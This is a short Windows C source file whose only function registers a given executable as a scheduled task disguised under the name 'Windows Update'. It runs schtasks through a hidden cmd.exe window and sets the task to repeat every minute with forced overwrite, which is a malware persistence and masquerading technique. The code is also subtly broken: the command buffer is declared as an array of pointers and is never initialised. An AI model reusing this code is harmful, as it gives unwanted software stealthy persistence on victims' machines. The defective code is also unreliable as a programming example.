#include "header.h"

void addToAutoRun(LPWSTR filePath)
{
	// Add to taskmanager

	LPWSTR cmdAddCommand[255];
	STARTUPINFO cif;
	PROCESS_INFORMATION pi;

	wcscat_s(cmdAddCommand, 255, L" /c schtasks /CREATE /tn \"Windows Update\" /tr ");
	wcscat_s(cmdAddCommand, 255, filePath);
	wcscat_s(cmdAddCommand, 255, L" /st 00:00 /du 9999:59 /sc daily /ri 1 /f");

	ZeroMemory(&cif, sizeof(STARTUPINFO));
	CreateProcess(L"C:\\Windows\\system32\\cmd.exe", cmdAddCommand, NULL, NULL, FALSE, CREATE_NO_WINDOW | NORMAL_PRIORITY_CLASS, NULL, NULL, &cif, &pi);

	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}
